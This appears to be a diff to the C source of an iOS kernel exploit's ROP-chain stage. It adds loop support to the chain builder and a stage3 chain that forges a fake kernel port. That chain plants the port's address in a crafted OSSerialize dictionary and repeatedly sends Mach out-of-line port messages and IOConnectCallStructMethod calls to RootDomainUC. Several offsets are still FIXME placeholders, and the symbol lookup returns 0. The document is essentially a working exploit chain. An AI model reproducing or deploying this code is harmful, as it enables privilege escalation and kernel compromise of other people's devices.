@@ -1,6 +1,89 @@
 #include "common.h"
 #include "rop.h"
+#include "stage3.h"
 
+
+typedef struct {
+	mach_msg_header_t head;
+	mach_msg_body_t msgh_body;
+	mach_msg_ool_ports_descriptor_t desc[1];
+	char pad[4096]; // FIXME: what a waste
+} ool_message_struct;
+
+typedef uint64_t kptr_t;
+
+typedef volatile struct {
+    uint32_t ip_bits;
+    uint32_t ip_references;
+    struct {
+        kptr_t data;
+        uint32_t type;
+#ifdef __LP64__
+        uint32_t pad;
+#endif
+    } ip_lock; // spinlock
+    struct {
+        struct {
+            struct {
+                uint32_t flags;
+                uint32_t waitq_interlock;
+                uint64_t waitq_set_id;
+                uint64_t waitq_prepost_id;
+                struct {
+                    kptr_t next;
+                    kptr_t prev;
+                } waitq_queue;
+            } waitq;
+            kptr_t messages;
+            uint32_t seqno;
+            uint32_t receiver_name;
+            uint16_t msgcount;
+            uint16_t qlimit;
+#ifdef __LP64__
+            uint32_t pad;
+#endif
+        } port;
+        kptr_t klist;
+    } ip_messages;
+    kptr_t ip_receiver;
+    kptr_t ip_kobject;
+    kptr_t ip_nsrequest;
+    kptr_t ip_pdrequest;
+    kptr_t ip_requests;
+    kptr_t ip_premsg;
+    uint64_t ip_context;
+    uint32_t ip_flags;
+    uint32_t ip_mscount;
+    uint32_t ip_srights;
+    uint32_t ip_sorights;
+} kport_t;
+
+#define IO_BITS_ACTIVE 0x80000000
+#define IOT_PORT 0
+#define IKOT_NONE 0
+#define IKOT_TASK 2
+#define IKOT_IOKIT_CONNECT 29
+#define IKOT_CLOCK 25
+#define NENT 1
+enum
+{
+    kOSSerializeDictionary      = 0x01000000U,
+    kOSSerializeArray           = 0x02000000U,
+    kOSSerializeSet             = 0x03000000U,
+    kOSSerializeNumber          = 0x04000000U,
+    kOSSerializeSymbol          = 0x08000000U,
+    kOSSerializeString          = 0x09000000U,
+    kOSSerializeData            = 0x0a000000U,
+    kOSSerializeBoolean         = 0x0b000000U,
+    kOSSerializeObject          = 0x0c000000U,
+
+    kOSSerializeTypeMask        = 0x7F000000U,
+    kOSSerializeDataMask        = 0x00FFFFFFU,
+
+    kOSSerializeEndCollection   = 0x80000000U,
+
+    kOSSerializeMagic           = 0x000000d3U,
+};
 
 uint64_t get_rop_var_addr(offset_struct_t * offsets, rop_var_t * ropvars, char * name) {
 	while (ropvars != NULL) {
@@ -16,35 +99,159 @@ void build_chain(int fd, offset_struct_t * offsets,rop_var_t * ropvars) {
 	rop_gadget_t * next = offsets->stage3_ropchain;	
 	uint64_t buf;
 	int offset_delta = 0;
+	uint64_t chain_pos = 0;
 	while (next != NULL) {
 		switch (next->type) {
 			case CODEADDR:
 				// value doesn't need to be slid anymore
 				buf = next->value;
 				write(fd,&buf,8);
+				chain_pos += 8;
 				break;
 			case OFFSET:
 				buf = (uint64_t)next->value + (uint64_t)offsets->stage3_base + offset_delta;
 				write(fd,&buf,8);
+				chain_pos += 8;
 				break;
 			case STATIC:
 				buf = next->value;
 				write(fd,&buf,8);
+				chain_pos += 8;
 				break;
 			case BUF:
 				write(fd,(void*)next->value,next->second_val);
 				offset_delta += next->second_val;
+				chain_pos += next->second_val;
 				break;
 			case ROP_VAR:
 				buf = get_rop_var_addr(offsets,ropvars,(char*)next->value) + next->second_val;
 				write(fd,&buf,8);
+				chain_pos += 8;
+				break;
+			case ROP_LOOP_START:
+				{
+				char * loop_buf_name = (char*)next->value;
+				// get the length we need from one ROP_LOOP_BREAK in the chain
+				int chain_per_break = 0;
+				{
+						// setup rop chain generator
+						rop_gadget_t * prev = NULL;
+						rop_gadget_t * curr_gadget = malloc(sizeof(rop_gadget_t));
+						curr_gadget->next = NULL;
+						curr_gadget->type = NONE;
+						curr_gadget->comment = NULL;
+						int ropchain_len = 0;
+						int rop_var_tmp_nr = 0;
+						
+						// free the buf we allocated for the loop
+						ROP_VAR_ARG64(loop_buf_name,1);
+						CALL_FUNC(get_addr_from_name("free"),0,0,0,0,0,0,0,0);
+						
+						// pivot the stack to where we want it
+						CALL_FUNC(offsets->stack_pivot,0,0,0,0,0,0,0,0);
+						chain_per_break = ropchain_len * 8;
+				}
+				int loop_size = 0;
+				rop_gadget_t * lookahead_gadget = next->next;
+				while (lookahead_gadget != NULL) {
+					if (lookahead_gadget->type == ROP_LOOP_END) {loop_size += chain_per_break;break;}
+					if (lookahead_gadget->type == ROP_LOOP_BREAK) {loop_size += chain_per_break;}
+					else {loop_size += 8;}
+					if (lookahead_gadget->type == ROP_LOOP_START) {printf("inner loops aren't supported atm\n");exit(1);}
+					lookahead_gadget = lookahead_gadget->next;
+				}
+				if (lookahead_gadget == NULL) {printf("Loop start without an end!\n");exit(1);}
+
+				// inject the gadgets to alloc a buffer and copy the part of the chain which is the loop into it
+				rop_gadget_t * bck_next = next->next;
+				uint64_t chain_start = 0;
+				{
+						// setup rop chain generator
+						rop_gadget_t * prev = NULL;
+						rop_gadget_t * curr_gadget = next;
+						curr_gadget->next = NULL;
+						curr_gadget->type = NONE;
+						curr_gadget->comment = NULL;
+						int ropchain_len = 0;
+						int rop_var_tmp_nr = 0;
+						
+						CALL_FUNC_RET_SAVE_VAR(loop_buf_name,get_addr_from_name("malloc"),loop_size,0,0,0,0,0,0,0);
+
+						ROP_VAR_ARG64(loop_buf_name,1);
+						chain_start = chain_pos + offsets->stage3_base + ropchain_len*8 + 16*8; /* to get behind that memcpy call */
+						CALL_FUNC(get_addr_from_name("memcpy"),0,chain_start,loop_size,0,0,0,0,0);
+
+						curr_gadget->next = bck_next;
+				}
+
+				// replace all the ROP_LOOP_BREAK gadgets with the chain
+				lookahead_gadget = next;
+				while (lookahead_gadget != NULL) {
+					if (lookahead_gadget->type == ROP_LOOP_END) {
+						// setup rop chain generator
+						rop_gadget_t * prev = NULL;
+						rop_gadget_t * curr_gadget = lookahead_gadget;
+						bck_next = lookahead_gadget->next;
+						curr_gadget->next = NULL;
+						curr_gadget->type = NONE;
+						curr_gadget->comment = NULL;
+						int ropchain_len = 0;
+						int rop_var_tmp_nr = 0;
+						
+						
+						// memcpy the buffer back over the loop
+						ADD_COMMENT("restore the loop stack");
+						ROP_VAR_ARG64(loop_buf_name,2);
+						CALL_FUNC(get_addr_from_name("memcpy"),chain_start,0,loop_size,0,0,0,0,0);
+						
+						ADD_COMMENT("stack pivot mov sp,x2");
+						CALL_FUNC(offsets->stack_pivot,0,chain_start,0,0,0,0,0,0);
+						curr_gadget->next = bck_next;
+						break;
+					}
+					if (lookahead_gadget->type == ROP_LOOP_BREAK) {
+						// setup rop chain generator
+						rop_gadget_t * prev = NULL;
+						rop_gadget_t * curr_gadget = lookahead_gadget;
+						bck_next = lookahead_gadget->next;
+						curr_gadget->next = NULL;
+						curr_gadget->type = NONE;
+						curr_gadget->comment = NULL;
+						int ropchain_len = 0;
+						int rop_var_tmp_nr = 0;
+						
+						
+						// free the buf we allocated for the loop
+						ROP_VAR_ARG64(loop_buf_name,1);
+						CALL_FUNC(get_addr_from_name("free"),0,0,0,0,0,0,0,0);
+						
+						// pivot the stack to where we want it
+						CALL_FUNC(offsets->stack_pivot,0,chain_start+loop_size,0,0,0,0,0,0);
+						curr_gadget->next = bck_next;
+					}
+					lookahead_gadget = lookahead_gadget->next;
+				}
+
+				continue; // we have to handle the current gadget again, cause we overwrote it
+				}
+				break;
+			case ROP_LOOP_BREAK:
+				printf("ROP_LOOP_BREAK OUTSIDE OF A LOOP\n");
+				exit(1);
+				break;
+			case ROP_LOOP_END:
 				break;
 			default:
 				buf = 0;
 				write(fd,&buf,8);
+				chain_pos += 8;
 		}
 		next = next->next;
 	}
+}
+uint64_t get_addr_from_name(char * name) {
+	// TODO: dlsym - current_dyld_slide
+	return 0;
 }
 char * pos_description_DBG(int pos, int longjmp_buf) {
 	char * buf = malloc(100);
@@ -128,6 +335,124 @@ void build_chain_DBG(offset_struct_t * offsets,rop_var_t * ropvars) {
 				current_addr += 8;
 				pos++;
 				break;
+			case ROP_LOOP_START:
+				{
+				char * loop_buf_name = (char*)next->value;
+				// get the length we need from one ROP_LOOP_BREAK in the chain
+				int chain_per_break = 0;
+				{
+						// setup rop chain generator
+						rop_gadget_t * prev = NULL;
+						rop_gadget_t * curr_gadget = malloc(sizeof(rop_gadget_t));
+						curr_gadget->next = NULL;
+						curr_gadget->type = NONE;
+						curr_gadget->comment = NULL;
+						int ropchain_len = 0;
+						int rop_var_tmp_nr = 0;
+						
+						// free the buf we allocated for the loop
+						ROP_VAR_ARG64(loop_buf_name,1);
+						CALL_FUNC(get_addr_from_name("free"),0,0,0,0,0,0,0,0);
+						
+						// pivot the stack to where we want it
+						CALL_FUNC(offsets->stack_pivot,0,0,0,0,0,0,0,0);
+						chain_per_break = ropchain_len * 8;
+				}
+				int loop_size = 0;
+				rop_gadget_t * lookahead_gadget = next->next;
+				while (lookahead_gadget != NULL) {
+					if (lookahead_gadget->type == ROP_LOOP_END) {loop_size += chain_per_break; break;}
+					if (lookahead_gadget->type == ROP_LOOP_BREAK) {loop_size += chain_per_break;}
+					else {loop_size += 8;}
+					if (lookahead_gadget->type == ROP_LOOP_START) {printf("inner loops aren't supported atm\n");exit(1);}
+					lookahead_gadget = lookahead_gadget->next;
+				}
+				if (lookahead_gadget == NULL) {printf("Loop start without an end!\n");exit(1);}
+
+				// inject the gadgets to alloc a buffer and copy the part of the chain which is the loop into it
+				rop_gadget_t * bck_next = next->next;
+				uint64_t chain_start = 0;
+				{
+						// setup rop chain generator
+						rop_gadget_t * prev = NULL;
+						rop_gadget_t * curr_gadget = next;
+						curr_gadget->next = NULL;
+						curr_gadget->type = NONE;
+						curr_gadget->comment = NULL;
+						int ropchain_len = 0;
+						int rop_var_tmp_nr = 0;
+						
+						ADD_COMMENT("malloced a buffer where we will copy the loop");
+						CALL_FUNC_RET_SAVE_VAR(loop_buf_name,get_addr_from_name("malloc"),loop_size,0,0,0,0,0,0,0);
+
+						ADD_COMMENT("Copy the loop");
+						ROP_VAR_ARG64(loop_buf_name,1);
+						chain_start = current_addr + ropchain_len*8 + 16*8; /* to get behind that memcpy call */
+						CALL_FUNC(get_addr_from_name("memcpy"),0,chain_start,loop_size,0,0,0,0,0);
+
+						curr_gadget->next = bck_next;
+				}
+
+				// replace all the ROP_LOOP_BREAK gadgets with the chain
+				lookahead_gadget = next;
+				while (lookahead_gadget != NULL) {
+					if (lookahead_gadget->type == ROP_LOOP_END) {
+						// setup rop chain generator
+						rop_gadget_t * prev = NULL;
+						rop_gadget_t * curr_gadget = lookahead_gadget;
+						bck_next = lookahead_gadget->next;
+						curr_gadget->next = NULL;
+						curr_gadget->type = NONE;
+						curr_gadget->comment = NULL;
+						int ropchain_len = 0;
+						int rop_var_tmp_nr = 0;
+						
+						
+						// memcpy the buffer back over the loop
+						ADD_COMMENT("restore the loop stack");
+						ROP_VAR_ARG64(loop_buf_name,2);
+						CALL_FUNC(get_addr_from_name("memcpy"),chain_start,0,loop_size,0,0,0,0,0);
+						
+						ADD_COMMENT("stack pivot mov sp,x2");
+						CALL_FUNC(offsets->stack_pivot,0,chain_start,0,0,0,0,0,0);
+						
+						curr_gadget->next = bck_next;
+						break;
+					}
+					if (lookahead_gadget->type == ROP_LOOP_BREAK) {
+						// setup rop chain generator
+						rop_gadget_t * prev = NULL;
+						rop_gadget_t * curr_gadget = lookahead_gadget;
+						bck_next = lookahead_gadget->next;
+						curr_gadget->next = NULL;
+						curr_gadget->type = NONE;
+						curr_gadget->comment = NULL;
+						int ropchain_len = 0;
+						int rop_var_tmp_nr = 0;
+						
+						
+						// free the buf we allocated for the loop
+						ADD_COMMENT("free the copy of our loop");
+						ROP_VAR_ARG64(loop_buf_name,1);
+						CALL_FUNC(get_addr_from_name("free"),0,0,0,0,0,0,0,0);
+						
+						ADD_COMMENT("stack pivot mov sp,x2");
+						// pivot the stack to where we want it
+						CALL_FUNC(offsets->stack_pivot,0,chain_start+loop_size,0,0,0,0,0,0);
+						curr_gadget->next = bck_next;
+					}
+					lookahead_gadget = lookahead_gadget->next;
+				}
+
+				printf("ADDED LOOP WITH SIZE %d starting at 0x%llx\n",loop_size,chain_start);
+				continue; // we have to handle the current gadget again, cause we overwrote it
+				}
+			case ROP_LOOP_BREAK:
+				printf("ROP_LOOP_BREAK OUTSIDE OF A LOOP\n");
+				exit(1);
+				break;
+			case ROP_LOOP_END:
+				break;
 			default:
 				buf = 0;
 				printf("0x%.8llx: ",current_addr);
@@ -168,12 +493,12 @@ void build_databuffer(offset_struct_t * offsets, rop_var_t * ropvars) {
 void stage3(offset_struct_t * offsets,char * base_dir) {
 
 
-	offsets->stage3_databuffer_len = 0x1000;
+	offsets->stage3_databuffer_len = 0x10000;
 	offsets->stage3_databuffer = malloc(offsets->stage3_databuffer_len);
 
 	// let's go
 	INIT_FRAMEWORK(offsets);
-	
+/*	
 	CALL_FUNC(0x0,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48);
 	CALL_FUNC_WITH_RET_SAVE(0x0,0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48);
 	uint64_t * test = malloc(sizeof(uint64_t));
@@ -186,6 +511,114 @@ void stage3(offset_struct_t * offsets,char * base_dir) {
 	ADD_COMMENT("var/arg test");
 	ROP_VAR_ARG("test",1);
 	CALL_FUNC_RET_SAVE_VAR("test",0x40,0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48);
+	*/
+
+	// TODO: spawn racer thread here
+	
+	// SETUP VARS
+	char * tmp = malloc(100);
+	DEFINE_ROP_VAR("msg_port",sizeof(mach_port_t),tmp); // the port which we use to send and recieve the message
+	DEFINE_ROP_VAR("tmp_port",sizeof(mach_port_t),tmp); // the port which has to be in the message which we send to the kernel
+
+	ool_message_struct * ool_message = malloc(sizeof(ool_message_struct));
+	ool_message->head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
+    ool_message->head.msgh_local_port = MACH_PORT_NULL;
+    ool_message->head.msgh_size = sizeof(ool_message)-2048;
+    ool_message->msgh_body.msgh_descriptor_count = 1;
+    ool_message->desc[0].count = 1; // will still go to kalloc.16 but we don't have another point of failture
+    ool_message->desc[0].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
+    ool_message->desc[0].disposition = MACH_MSG_TYPE_MOVE_RECEIVE;
+
+	DEFINE_ROP_VAR("ool_msg",sizeof(ool_message_struct),ool_message); // the message we will send to the kernel
+	DEFINE_ROP_VAR("ool_msg_recv",sizeof(ool_message_struct),tmp); // the message we will recieve from the kernel
+
+	ROP_VAR_CPY_W_OFFSET("ool_msg",0 /*FIXME: offset should be desc[0].address*/,"tmp_port",0,sizeof(ool_message->desc[0].address));
+
+
+	kport_t * fakeport = malloc(sizeof(kport_t));
+	fakeport->ip_bits = IO_BITS_ACTIVE | IOT_PORT | IKOT_NONE;
+	fakeport->ip_references = 100;
+	fakeport->ip_lock.type = 0x11;
+	fakeport->ip_messages.port.receiver_name = 1;
+	fakeport->ip_messages.port.msgcount = MACH_PORT_QLIMIT_KERNEL;
+	fakeport->ip_messages.port.qlimit = MACH_PORT_QLIMIT_KERNEL;
+	fakeport->ip_srights = 99;
+
+	DEFINE_ROP_VAR("fakeport",sizeof(kport_t),fakeport); // the userland port
+
+	DEFINE_ROP_VAR("service",sizeof(io_service_t),tmp); // RootDomain Service
+	DEFINE_ROP_VAR("client",sizeof(io_connect_t),tmp); // RootDomainUC
+
+	unsigned int raw_dict[] = {
+		kOSSerializeMagic,
+		kOSSerializeEndCollection | kOSSerializeData | 0x10,
+		0xaaaaaaaa,
+		0xbbbbbbbb,
+		0x00000000,
+		0x00000000,
+	};
+	unsigned int * dict = malloc(sizeof(raw_dict));
+
+	DEFINE_ROP_VAR("dict",sizeof(raw_dict),dict); // dict for the UC
+	SET_ROP_VAR64_TO_VAR_W_OFFSET("dict",2*4,"fakeport",0); // overwrite 0xaa..bb with the address of our fakeport
+
+	DEFINE_ROP_VAR("self",sizeof(mach_port_t),&tmp);
+
+	char * wedidit_msg = malloc(100);
+	snprintf(wedidit_msg,100,"WE DID IT\n");
+	DEFINE_ROP_VAR("WEDIDIT",strlen(wedidit_msg)+1,wedidit_msg);
+
+
+#define CALL(name,arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8) \
+	ADD_COMMENT(name); \
+	CALL_FUNC(get_addr_from_name(name),arg1,arg2,arg3,arg4,arg5,arg6,arg7,arg8);
+
+	CALL_FUNC_RET_SAVE_VAR("self",get_addr_from_name("mach_task_self"),0,0,0,0,0,0,0,0);
+
+	CALL("seteuid",501,0,0,0,0,0,0,0); // drop priv to mobile so that we leak refs/get the dicts into kalloc.16
+
+	ADD_LOOP_START("main_loop");
+	
+		SET_ROP_VAR64("msg_port",MACH_PORT_NULL); 
+
+		// mach_port_allocate(self, MACH_PORT_RIGHT_RECEIVE, msg_port);
+		ROP_VAR_ARG64("self",1);
+		ROP_VAR_ARG("msg_port",3);
+		CALL("mach_port_allocate", 0, MACH_PORT_RIGHT_RECEIVE, 0,0,0,0,0,0);
+	
+		ROP_VAR_ARG64("self",1);
+		ROP_VAR_ARG64("msg_port",2);
+		ROP_VAR_ARG64("msg_port",3);
+		CALL("mach_port_insert_right",0,0,0, MACH_MSG_TYPE_MAKE_SEND,0,0,0,0);
+
+		ROP_VAR_CPY_W_OFFSET("ool_msg",0 /*FIXME: this must be head.msgh_remote_port */,"msg_port",0,sizeof(mach_port_t));
+
+		ROP_VAR_ARG("ool_msg",1);
+		ROP_VAR_ARG_W_OFFSET("ool_msg",3, 0 /*FIXME: offset to head.msgh_size */);
+		CALL("mach_msg",0,MACH_SEND_MSG,0,0,0,0,0,0);
+
+		// no need for another loop in rop... we can just unroll this one here
+		for (int i = 0; i < 10; i++) {
+			ROP_VAR_ARG64("client",1);
+			ROP_VAR_ARG("dict",3);
+			CALL("IOConnectCallStructMethod",0,7,0,sizeof(raw_dict),0,0,0,0);
+		}
+
+		ROP_VAR_CPY_W_OFFSET("ool_msg_recv",0 /*FIXME: this must be head.msgh_local_port */,"msg_port",0,sizeof(mach_port_t));
+
+		ROP_VAR_ARG("ool_msg_recv",1);
+		ROP_VAR_ARG64("msg_port",5);
+		CALL("mach_msg",0,MACH_RCV_MSG,0,sizeof(ool_message_struct),0,0,0,0);
+
+		// TODO: check if (*ool_msg_recv.desc[0].address)[0] != MACH_PORT_NULL
+
+	ADD_LOOP_END();
+
+	ROP_VAR_ARG("WEDIDIT",1);
+	CALL("puts",0,0,0,0,0,0,0,0);
+
+	CALL("sleep",10000,0,0,0,0,0,0,0);
+
 	if (curr_rop_var != NULL) {
 		build_databuffer(offsets,rop_var_top);
 	}
